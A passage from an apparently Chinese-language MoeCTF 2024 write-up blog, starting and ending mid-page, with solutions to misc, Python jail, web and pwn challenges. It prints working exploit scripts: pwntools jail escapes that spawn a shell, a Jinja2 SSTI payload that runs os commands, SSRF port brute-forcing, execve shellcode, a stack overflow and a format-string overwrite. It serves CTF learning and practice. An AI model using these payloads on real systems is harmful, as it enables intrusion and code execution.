\u0026#34;7\u0026#34;, \u0026#34;60\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;61\u0026#34;: \u0026#34;9\u0026#34;, \u0026#34;62\u0026#34;: \u0026#34;0\u0026#34;} flag = \u0026#34;\u0026#34; with open(\u0026#34;usb.txt\u0026#34;,\u0026#34;r+\u0026#34;) as f: lines = f.readlines() for line in lines: key = line[4:6] flag += normalKeys[key] print (flag) 运行结果：\n6d6f656374667b6e3168613077307930756469616e6c33323435317d 再转一下hex就能拿到flag：\nAbnormal lag 频谱图直接看，注意题目给出的正则表达式：\nflag格式:moectf{[\\da-f-]+} moectf{09e3f7f8-c970-4c71-92b0-6f03a677421a}\nso many \u0026rsquo;m' 字频统计，然后照着拼就是flag，注意M和p的位置要换一下：\nmoectf{C0MpuTaskingD4rE}\n小小套娃 png chunk块最后一个明显不对劲，binwalk出来一个zlib文件，文件夹里有解压好的文件，拿出来发现是个png文件，cyberchef转一下：\n图片是一个二维码，直接扫拿到第一个压缩包密码：\n送你一个key！you\u0026#39;ve got the zipkey:874jfy37yf37y7 第二个txt文件是个零宽字符隐写，linux下vim打开编辑文件可以看到有哪些零宽字符：\n不过不知道为什么勾上了对应的零宽字符在线网站解不出，换了个网站直接出了：\n拿到第二个压缩包密码：\nidon\u0026#39;tknowmaybeits:dhufhduh48589 解压拿到flag.txt，里面是新佛曰加密的内容，直接解就拿到flag：\nmoejail_lv2.5 提示里给了正则表达式：\nif re.search(r\u0026#39;[\u0026#34;\\\u0026#39;0-8bdhosxy_]|[^\\x00-\\xff]\u0026#39;, code): print(\u0026#34;Nope\u0026#34;) if len(code) \u0026gt; 15: print(\u0026#34;Too long\u0026#34;) 容易想到 eval(input()) 来绕过限制，之后就是找flag，依旧在/tmp目录下：\nGive me your code: eval(input()) __import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat /tmp/the*\u0026#39;) moectf{50mEtlMeS-InpuT_CaN_be_A-M3tHOD_TO_BypAss_fIIt3rs0} moejail_lv3 if re.search(r\u0026#34;[A-z0-9]\u0026#34;, code): print(\u0026#34;Nope\u0026#34;) 用unicode字符来绕过即可：\nfrom pwn import * unicode_chr = \u0026#34;𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡＿\u0026#34; #𝘦𝘷𝘢𝘭(𝘪𝘯𝘱𝘶𝘵()) exp = \u0026#34;𝘦𝘷𝘢𝘭(𝘪𝘯𝘱𝘶𝘵())\u0026#34; p = remote(\u0026#34;127.0.0.1\u0026#34;,30179) p.recvuntil(b\u0026#34;Please enter \u0026#39;\u0026#34;) cha1 = p.recv(6).decode() p.recvuntil(b\u0026#34;\u0026#39;+\u0026#39;\u0026#34;) cha2 = p.recv(6).decode() cha = cha1 + cha2 p.sendline(cha.encode()) p.sendlineafter(b\u0026#34;Give me your code:\u0026#34;,exp.encode()) p.interactive() 之后正常在/tmp目录下找flag：\n__import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat /tmp/the*\u0026#39;) moectf{peP-aIloW_yOU_use-uN1coD3_cHar_A5-A5Ci1_onEs0} moejail_lv4 Hint: eval(code, {\u0026#34;__builtins__\u0026#34;: {\u0026#34;eval\u0026#34;: lambda *x: print(\u0026#34;sry, no eval for u\u0026#34;)},},{},) 执行eval的环境把所有内置函数都删掉了，只留了个改过的eval函数，具体就是如果code里想要执行 eval() ，无论括号里是什么，都会 print(\u0026quot;sry, no eval for u\u0026quot;)\n可以通过魔术方法重新获取 __builtins __ 模块，构造如下形式的继承链：\n().__class__.__base__.__subclasses__()[{}].__init__.__globals__[\u0026#34;__builtins__\u0026#34;][\u0026#34;__import__\u0026#34;](\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\u0026#39;.format(i) 由于eval不会返回 ().__class__.__base__.__subclasses__() 的结果，所以考虑爆破：\nfrom pwn import * def verify(): p.recvuntil(b\u0026#34;Please enter \u0026#39;\u0026#34;) cha1 = p.recv(6).decode() p.recvuntil(b\u0026#34;\u0026#39;+\u0026#39;\u0026#34;) cha2 = p.recv(6).decode() cha = cha1 + cha2 p.sendline(cha.encode()) def exp(i): exp = \u0026#39;().__class__.__base__.__subclasses__()[{}].__init__.__globals__[\u0026#34;__builtins__\u0026#34;][\u0026#34;__import__\u0026#34;](\u0026#34;os\u0026#34;).system(\u0026#34;ls /\u0026#34;)\u0026#39;.format(i) return exp p = remote(\u0026#34;127.0.0.1\u0026#34;,1086) verify() for i in range(159): p.sendlineafter(b\u0026#34;Give me your code:\u0026#34;,exp(i).encode()) res = p.recvline().decode() verify() print(i,res) 运行结果中有一些是成功执行 whoami 的，比如最后几个：\n154 nobody 155 nobody 156 nobody 157 🤔 Error: \u0026#39;wrapper_descriptor\u0026#39; object has no attribute \u0026#39;__globals__\u0026#39; 158 nobody 之后就是拿shell找flag，给出完整exp：\nfrom pwn import * def verify(): p.recvuntil(b\u0026#34;Please enter \u0026#39;\u0026#34;) cha1 = p.recv(6).decode() p.recvuntil(b\u0026#34;\u0026#39;+\u0026#39;\u0026#34;) cha2 = p.recv(6).decode() cha = cha1 + cha2 p.sendline(cha.encode()) \u0026#39;\u0026#39;\u0026#39; def exp(i): exp = \u0026#39;().__class__.__base__.__subclasses__()[{}].__init__.__globals__[\u0026#34;__builtins__\u0026#34;][\u0026#34;__import__\u0026#34;](\u0026#34;os\u0026#34;).system(\u0026#34;ls /\u0026#34;)\u0026#39;.format(i) return exp p = remote(\u0026#34;127.0.0.1\u0026#34;,1086) verify() for i in range(159): p.sendlineafter(b\u0026#34;Give me your code:\u0026#34;,exp(i).encode()) res = p.recvline().decode() verify() print(i,res) \u0026#39;\u0026#39;\u0026#39; p = remote(\u0026#34;127.0.0.1\u0026#34;,1086) verify() exp = \u0026#39;().__class__.__base__.__subclasses__()[158].__init__.__globals__[\u0026#34;__builtins__\u0026#34;][\u0026#34;__import__\u0026#34;](\u0026#34;os\u0026#34;).system(\u0026#34;sh\u0026#34;)\u0026#39; p.sendlineafter(b\u0026#34;Give me your code:\u0026#34;,exp.encode()) p.interactive() ls /tmp therealflag_4e9e98cbe32a98ead5ed47dd59b3b238 cat /tmp/t* moectf{YoU-c4n_reCoveR_Glob4l5-@ND_6UI1tInS-FR0M-cuST0M_functions0} Web渗透测试与审计入门指北 本地用phpstudy起一个网站即可：\n或者直接分析 index.php 和 script.php ，找出加密方式，能看到php里给出了ciphertext和key：\n\u0026lt;?php $data = array( \u0026#34;ciphertext\u0026#34; =\u0026gt; \u0026#34;F8NX+bX/AAT5oTosfY7JpiQ1oQM0onbI/41oFG9khFMr68qBn8ZlPia8XhrLSMFo\u0026#34;, \u0026#34;key\u0026#34; =\u0026gt; \u0026#34;1234567891011121\u0026#34; ); header(\u0026#39;Content-Type: application/json\u0026#39;); echo json_encode($data); ?\u0026gt; 再关注html中的body部分，能看到进行了base64_deocde + AES-CBC的操作：\n\u0026lt;body\u0026gt; \u0026lt;h1 class=\u0026#34;title\u0026#34;\u0026gt;Welcome to Moectf\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;xt\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; fetch(\u0026#39;script.php\u0026#39;) .then(response =\u0026gt; response.json()) .then(data =\u0026gt; { var ciphertext = data.ciphertext; var key = CryptoJS.enc.Utf8.parse(data.key); var iv = CryptoJS.enc.Utf8.parse(\u0026#34;17829693\u0026#34;); var decodedCiphertext = CryptoJS.enc.Base64.parse(ciphertext); var decrypted = CryptoJS.AES.decrypt({ ciphertext: decodedCiphertext }, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 }); var plaintext = decrypted.toString(CryptoJS.enc.Utf8); document.getElementById(\u0026#39;xt\u0026#39;).innerHTML = \u0026#39;\u0026lt;p\u0026gt;\u0026#39; + plaintext + \u0026#39;\u0026lt;/p\u0026gt;\u0026#39;; }) .catch(error =\u0026gt; console.error(\u0026#39;Error:\u0026#39;, error)); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; cyberchef解一下也能拿到flag，注意iv不足16字节，填\\x00补齐即可：\n勇闯铜人阵 要求5次正确回答问题，并且根据问题，会有两种类型的回答，可以先抓包看一下传参类型：\n发现是POST传参以及对应问题位置，写个脚本注意保持会话即可：\nimport requests import re position_mapping = {\u0026#34;1\u0026#34;:\u0026#34;北方\u0026#34;,\u0026#34;2\u0026#34;:\u0026#34;东北方\u0026#34;,\u0026#34;3\u0026#34;:\u0026#34;东方\u0026#34;,\u0026#34;4\u0026#34;:\u0026#34;东南方\u0026#34;,\u0026#34;5\u0026#34;:\u0026#34;南方\u0026#34;,\u0026#34;6\u0026#34;:\u0026#34;西南方\u0026#34;,\u0026#34;7\u0026#34;:\u0026#34;西方\u0026#34;,\u0026#34;8\u0026#34;:\u0026#34;西北方\u0026#34;} def start(): start = {\u0026#34;player\u0026#34;: \u0026#34;w8nn9z\u0026#34;, \u0026#34;direct\u0026#34;: \u0026#34;弟子明白\u0026#34;} res = session.post(url,data=start) return res def num(res): pattern1 = re.compile(r\u0026#39;id=\u0026#34;status\u0026#34;\u0026gt;\\s*.*\\s*\u0026lt;/\u0026#39;) message = re.findall(pattern1,res)[0] pattern2 = re.compile(r\u0026#39;\\d+\u0026#39;) num = re.findall(pattern2,message) return num def sol(res): num_list = num(res.text) if len(num_list) == 1: req = position_mapping[str(num_list[0])] res = session.post(url,data={\u0026#34;player\u0026#34;: \u0026#34;w8nn9z\u0026#34;, \u0026#34;direct\u0026#34;: req}) return res else: req = position_mapping[str(num_list[0])] + \u0026#34;一个\u0026#34; + \u0026#34;，\u0026#34; + position_mapping[str(num_list[1])] + \u0026#34;一个\u0026#34; res = session.post(url,data={\u0026#34;player\u0026#34;: \u0026#34;w8nn9z\u0026#34;, \u0026#34;direct\u0026#34;: req}) return res url = \u0026#34;http://127.0.0.1:1433/\u0026#34; session = requests.session() res = start() for i in range(5): res = sol(res) print(res.text) 输出结果：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;听声辩位\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;/static/style.css\u0026#34;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1 id=\u0026#34;title\u0026#34;\u0026gt;听声辩位\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;闯关弟子注意，本关继续考验你听声辩位的功夫\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;你可定坐中央，先后将有五波数字抛出，你需要在3秒内按要求说出方位\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;示例：1 -\u0026gt; 北方\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;2,3 -\u0026gt; 东北方一个，东方一个\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;输入选手名字和 \u0026#34;弟子明白\u0026#34; 开始游戏\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;parent\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/images/test.png\u0026#34; id=\u0026#34;imgs\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;form action=\u0026#34;/restart\u0026#34; method=\u0026#34;get\u0026#34; id=\u0026#34;div_restart\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;restart\u0026#34;\u0026gt;按下按钮重新开始：\u0026lt;/label\u0026gt; \u0026lt;button id=\u0026#34;restart\u0026#34;\u0026gt;开始\u0026lt;/button\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;form action=\u0026#34;/\u0026#34; method=\u0026#34;post\u0026#34; id=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;player\u0026#34;\u0026gt;请输入选手名字：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;player\u0026#34; name=\u0026#34;player\u0026#34;\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;label for=\u0026#34;direct\u0026#34;\u0026gt;请回答问题：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;direct\u0026#34; name=\u0026#34;direct\u0026#34;\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;label for=\u0026#34;say\u0026#34;\u0026gt;按下按钮回答：\u0026lt;/label\u0026gt; \u0026lt;button id=\u0026#34;say\u0026#34;\u0026gt;回答\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;h1 id=\u0026#34;status\u0026#34;\u0026gt; \u0026lt;span style=\u0026#34;color:green;\u0026#34;\u0026gt;你过关！（过关的小曲）\u0026lt;br\u0026gt;moectf{w3LllI_YoU-PA55_The_cHal1eNGe-frrRrRom_tOnRen8}\u0026lt;/span\u0026gt; \u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; who\u0026rsquo;s blog? 网站有这样一句话，提示传参id：\n这里曾经是 Sxrhhh 的个人小站。但是迫于压力，Sxrhhh 只能拍卖自己的网站了。提供你的 id 来领养这个可怜的网站吧 尝试后可以发现是ssti，并且如果报错可以发现是Jinjia2的模板，之后就是常规注入：\nhttp://127.0.0.1:32683/?id={{().__class__.__base__.__subclasses__()[239].__init__.__globals__[\u0026#39;__builtins__\u0026#39;].eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;env\u0026#39;).read()\u0026#34;\u0026#34;)}} KUBERNETES_SERVICE_PORT=443 KUBERNETES_PORT=tcp://10.43.0.1:443 HOSTNAME=ret2shell-40-7062 PYTHON_PIP_VERSION=23.0.1 SHLVL=1 HOME=/root GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D WERKZEUG_SERVER_FD=4 PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/66d8a0f637083e2c3ddffc0cb1e65ce126afb856/public/get-pip.py WERKZEUG_RUN_MAIN=true KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1 PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_PORT_443_TCP_PORT=443 KUBERNETES_PORT_443_TCP_PROTO=tcp LANG=C.UTF-8 PYTHON_VERSION=3.10.14 PYTHON_SETUPTOOLS_VERSION=65.5.1 KUBERNETES_SERVICE_PORT_HTTPS=443 KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443 KUBERNETES_SERVICE_HOST=10.43.0.1 PWD=/app PYTHON_GET_PIP_SHA256=6fb7b781206356f45ad79efbb19322caa6c2a5ad39092d0d44d0fec94117e118 FLAG=moectf{d0-y0u-kNOw-SST1-4Nd_pl3A5e-V151t_5XRHHhS-BL0g2} ImageCloud 附件给了两个flask服务的源码，app.py 部署在5000的端口上，而 app2.py 部署在5001~5999的端口上，同时在 uploads 目录下可以看到有损坏的 flag.jpg ，提示了flag图片的位置\n先分析 app.py ，实现了一个图片上传的功能，UPLOAD_FOLDER = 'static/' ，且限制了常见的图片后缀，同时 /image 路由用来获取图片：\n@app.route(\u0026#39;/image\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def load_image(): url = request.args.get(\u0026#39;url\u0026#39;) if not url: return \u0026#39;URL 参数缺失\u0026#39;, 400 try: response = requests.get(url) response.raise_for_status() img = Image.open(BytesIO(response.content)) img_io = BytesIO() img.save(img_io, img.format) img_io.seek(0) return send_file(img_io, mimetype=img.get_format_mimetype()) except Exception as e: return f\u0026#34;无法加载图片: {str(e)}\u0026#34;, 400 再分析 app2.py ，同样有图片上传功能，不过 UPLOAD_FOLDER = 'uploads/'，也存在获取图片的路由：\n@app.route(\u0026#39;/image/\u0026lt;filename\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def load_image(filename): filepath = os.path.join(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], filename) if os.path.exists(filepath): mime = get_mimetype(filepath) return send_file(filepath, mimetype=mime) else: return \u0026#39;文件未找到\u0026#39;, 404 这样自然能想到通过外部图片云的 /image 路由去访问内部图片云的flag图片，只要再爆破一下 app2.py 的端口即可：\n拿到flag图片：\n二进制漏洞审计入门指北 直接nc是不行的，需要用pwntools进行交互\nfrom pwn import * p = remote(\u0026#34;127.0.0.1\u0026#34;,52609) p.interactive() 运行结果:\nHey, how did you get here? I\u0026#39;ve been waiting so long, for anyone... To honor your courage, I decided to give you a flag. But next time, it won\u0026#39;t be so easy. moectf{Welcome_to_the_journey_of_Pwn} Good luck. By the way, netcat is not a cat! flag_helper nc连上以后先是4个选择，都尝试了一遍后发现只有4才能读取文件内容进而读取/flag\nWelcome to MoeCTF 2024 \u0026#34;Pwn\u0026#34;. Have trouble with flag? What can I do for you? 1. \u0026#34;Capture the flag.\u0026#34; 2. \u0026#34;Goodbye.\u0026#34; 3. \u0026#34;V me 50 pts.\u0026#34; 4. \u0026#34;Play game with me.\u0026#34; Make your choice. \u0026gt; 4 OK. Tell me a file path. I can `read` what others cannot `read`. \u0026gt; /flag 后要求输入open的\u0026rsquo;flags\u0026rsquo;参数，输入0发现能打开/flag文件\nNow, give me `flags` for this to-be-opened file. \u0026gt; 0 Opened file /dev/random. Opened file /dev/urandom. Opened file /flag. Opened file /dev/zero. 后要求输入mmap的\u0026rsquo;prot\u0026rsquo;参数和\u0026rsquo;flags\u0026rsquo;参数，本来不知道是什么，后来在做一道ORW题目时看到了关于mmap的内容（\n于是知道prot参数为7，flags参数为0x22即34\nThen we have to `mmap` a place for the content... How do we `prot` it? \u0026gt; 7 And, `flags`. (Calm down, your flag is on the way.) \u0026gt; 34 Coming in three! Two... Oonnne... 最后只要输入/flag对应的文件描述符即可，fd从0开始分别对应了标准输入，标准输出，标准错误，以及打开的文件/dev/random，/dev/unrandom，/flag，/dev/zero，所以/flag对应的fd为5\n... I forgot the `fd` to read from. Do you still remember? \u0026gt; 5 Oh, yes yeah, 5. Finally, here you are. moectf{f1IE-de5CR1PTOr-IS-PrEDlcT@bIe46361a} NotEnoughTime 口算题卡属于是，只需注意地板除以及去掉题目的\\n即可，进行多次交互得flag\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = remote(\u0026#34;127.0.0.1\u0026#34;,53597) p.recvuntil(b\u0026#34;Let\u0026#39;s begin with simple ones.\\n\u0026#34;) p.sendlineafter(b\u0026#34;=\u0026#34;,b\u0026#34;2\u0026#34;) p.sendlineafter(b\u0026#34;=\u0026#34;,b\u0026#34;0\u0026#34;) p.recvuntil(b\u0026#34;OK, then some tough ones. Be WELL PREPARED!\\n\u0026#34;) try: while (1): question = p.recvuntil(b\u0026#34;=\u0026#34;).decode().replace(\u0026#34;=\u0026#34;,\u0026#34;\u0026#34;).replace(\u0026#34;\\n\u0026#34;,\u0026#34;\u0026#34;).replace(\u0026#34;/\u0026#34;,\u0026#34;//\u0026#34;) #print (question) answer = str(eval(question)).encode() p.sendline(answer) except EOFError: pass p.interactive() 运行结果:\n你过关。 moectf{ArIthMEtlC-iS_noT_M@Them@tIc5f1720} no_more_gets 基础的栈溢出，注意栈对齐即可拿到shell\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = remote(\u0026#34;127.0.0.1\u0026#34;,53741) offset = 0x50 + 8 backdoor_addr = 0x401176 ret = 0x40101a payload = cyclic(offset) + p64(ret) + p64(backdoor_addr) p.sendlineafter(b\u0026#34;This is my own shell, enter the password or get out.\\n\u0026#34;,payload) p.interactive() #moectf{G3ts_StriNG-thUs-GEts_FLag37495d75} Moeplane 没有对数组 engine_thrust 的 index 作限制，导致可以用负数覆盖 flight 上的数据：\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = remote(\u0026#34;127.0.0.1\u0026#34;, 27818) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;1\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;-15\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, str(0x10).encode()) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;1\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;-16\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, str(0x20).encode()) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;1\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;-17\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, str(0x30).encode()) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;1\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;-18\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, str(0x40).encode()) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;1\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;-19\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, str(0x50).encode()) p.interactive() #moectf{compUt3r_fallur3_WOnt_leT_YOu_fly524785} leak_sth 随机数挑战，种子是当前时间，每次都不同，python里调用C库函数即可生成同样的随机数完成挑战拿到shell\n不过注意%ld表示有符号长整型，范围为 -2147483648 ~ 2147483647（10位十进制数）\nfrom pwn import * from ctypes import * libc = cdll.LoadLibrary(\u0026#34;./libc.so.6\u0026#34;) context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) #elf = ELF(\u0026#34;./pwn\u0026#34;) #p = process(\u0026#34;./pwn\u0026#34;) p = remote(\u0026#34;127.0.0.1\u0026#34;,18156) seed = libc.time(0) libc.srand(seed) challenge_num = libc.rand() print (challenge_num) p.sendlineafter(b\u0026#34;What\u0026#39;s your name?\\n\u0026#34;,b\u0026#34;w8nn9z\u0026#34;) p.sendlineafter(b\u0026#34;Give me the number\\n\u0026#34;,str(challenge_num).encode()) p.interactive() #moectf{YOU_aRe_1ukY_Or_clEv3R29ef66bc} LoginSystem 输出用户名处存在明显的格式化字符串漏洞（fmt），gdb调试可以知道偏移为8，主要是通过printf和%n达成覆盖password地址内容的目的，进而拿shell\n一开始还想着怎么缩短payload，后来想了想输入b\u0026quot;\\x00\u0026quot;型的password就可以了，不用是可打印字符，本地多调试几次就能出\n这题我自己在用fmtstr_payload的时候会出问题，直接手动构造了（\nfrom pwn import * #from ctypes import * #libc = cdll.LoadLibrary(\u0026#34;./libc.so.6\u0026#34;) context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) elf = ELF(\u0026#34;./pwn\u0026#34;) #p = process(\u0026#34;./pwn\u0026#34;) p = remote(\u0026#34;127.0.0.1\u0026#34;,19336) payload = b\u0026#34;%2c%9$ln\u0026#34; + p64(0x404050) p.sendlineafter(b\u0026#34;username: \u0026#34;,payload) #gdb.attach(p) p.sendlineafter(b\u0026#34;! Please input your password: \\n\u0026#34;,b\u0026#34;\\x02\u0026#34; + b\u0026#34;\\x00\u0026#34;*7) p.interactive() #moectf{Oh_You_cAn_6YP4SS_THE_P@5sWORD235e525} ez_shellcode 没开NX，往栈上写入shellcode可以被执行，考虑到有对shellcode的长度限制，一开始直接用了个23长度的64位程序的shellcode梭了，后来自己又写了一个简单的系统调用的shellcode，都能打通\n不过这题有个地址随机化，shellcode写在泄露的nbytes_4的地址上即可\nfrom pwn import * #from ctypes import * #libc = cdll.LoadLibrary(\u0026#34;./libc.so.6\u0026#34;) context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) elf = ELF(\u0026#34;./pwn\u0026#34;) #p = process(\u0026#34;./pwn\u0026#34;) p = remote(\u0026#34;127.0.0.1\u0026#34;,29972) p.sendlineafter(b\u0026#34;Tell me your age:\\n\u0026#34;,b\u0026#34;1000\u0026#34;) p.recvuntil(b\u0026#34;Here is a gift for you :\\n\u0026#34;) nbytes_4_addr = int((p.recv(14)),base=16) #print (hex(nbytes_4_addr)) offset = 0x60 + 8 #shellcode = b\u0026#34;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#34; shellcode = asm(\u0026#39;\u0026#39;\u0026#39; mov rax,59 mov rbx,0x0068732f6e69622f push rbx mov rdi,rsp mov rsi,0 mov rdx,0 syscall \u0026#39;\u0026#39;\u0026#39;) #print (len(shellcode)) 37 payload = shellcode.ljust(offset) payload += p64(nbytes_4_addr) p.sendlineafter(b\u0026#34;What do you want to say?\\n\u0026#34;,payload) p.interactive() #moectf{WE1l_D0ne-my-fRieND4ce76b7954} 这是什么？random！ 先简单看看代码逻辑，是一个 0xA + 2 次的随机数验证，但最后两个无论是否正确都不会退出程序，所以只需前面的 0xA 次正确即可，不过这道题的种子生成用到了localtime，感觉在python中比较难实现指针，伪代码如下：\ntimer = time(0LL); v3 = localtime(\u0026amp;timer); srandom(v3-\u0026gt;tm_yday); 也就是说最后的seed是v3-\u0026gt;tm_yday，后来了解了localtime的用法，每一天对应的tm_yday是固定的，表示一年中的第几天，可以先写一个C语言代码弄出seed来再用python写交互脚本：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; int main () { struct tm *v3; time_t timer; int secret; timer = time(0); v3 = localtime(\u0026amp;timer); srandom(v3-\u0026gt;tm_yday); printf(\u0026#34;%d\\n\u0026#34;,v3-\u0026gt;tm_yday); secret = random() % 90000 + 10000; printf(\u0026#34;%d\u0026#34;,secret); return 0; } 我做此题日期是8.19，所以seed是231，c语言代码运行结果也是如此：\n$ ./a.out 231 48149 from pwn import * from ctypes import * libc = cdll.LoadLibrary(\u0026#34;./libc.so.6\u0026#34;) context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) #elf = ELF(\u0026#34;./pwn\u0026#34;) #p = process(\u0026#34;./pwn\u0026#34;) p = remote(\u0026#34;127.0.0.1\u0026#34;,1307) libc.srand(231) for i in range(0,0xA): challenge_num = libc.random() % 90000 + 10000 p.sendlineafter(b\u0026#34;Guess a five-digit number I\u0026#39;m thinking of\\n\u0026gt; \u0026#34;,str(challenge_num).encode()) p.interactive() #在此之后还要再交互两次，随便输什么数字，保证程序往下进行输出flag即可 #moectf{ranDOM_NUMBer5-AR3_pr3D1cT4BI3607f0c} 这是什么？shellcode！ 写一段shellcode发过去即可，用shellcraft好像也能打通\nfrom pwn import * from ctypes import * libc = cdll.LoadLibrary(\u0026#34;./libc.so.6\u0026#34;) context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) #elf = ELF(\u0026#34;./pwn\u0026#34;) #p = process(\u0026#34;./pwn\u0026#34;) p = remote(\u0026#34;192.168.1.6\u0026#34;,7971) shellcode = asm(\u0026#39;\u0026#39;\u0026#39; mov rax,59 mov rbx,0x0068732f6e69622f push rbx mov rdi,rsp mov rsi,0 mov rdx,0 syscall \u0026#39;\u0026#39;\u0026#39;) #shellcode = asm(shellcraft.sh()) p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;,shellcode) p.interactive() #moectf{GeTShELl-N3VER-S0-ea5y1a42caf12} 哦不！我的libc！ 非预期，试了下常用的命令，cat ls more less head tail啥的基本都不能用了，不过echo还能用，网上找到了关于echo输出文件内容的资料，先利用$(\u0026lt;/flag.txt)或者`\u0026lt;/flag.txt`获得 /flag.txt 文件内容作为输入的结果，再用echo进行输出，不过后来在做的时候发现不用echo也行，只不过会多个报错\n这几个方法都能出flag：\nroot@ret2shell-89-7062:/# echo $(\u0026lt;/flag.txt) moectf{busyb0x-1S-s0OOO00ioO0OOO00000O00Oo0o0o_Busy15} root@ret2shell-89-7062:~# echo `\u0026lt;/flag.txt` moectf{busyb0x-1S-s0OOO00ioO0OOO00000O00Oo0o0o_Busy15} root@ret2shell-89-7062:~# $(\u0026lt;/flag.txt) -bash: moectf{busyb0x-1S-s0OOO00ioO0OOO00000O00Oo0o0o_Busy15}: command not found root@ret2shell-89-7062:~# `\u0026lt;/flag.txt` -bash: moectf{busyb0x-1S-s0OOO00ioO0OOO00000O00Oo0o0o_Busy15}: command not found ","permalink":"https://blog.w8nn9z.top/posts/ctf/moectf-2024-writeup/","summary":"","title":"MoeCTF 2024 Writeup"},{"content":"1.png_master 附件只有一张 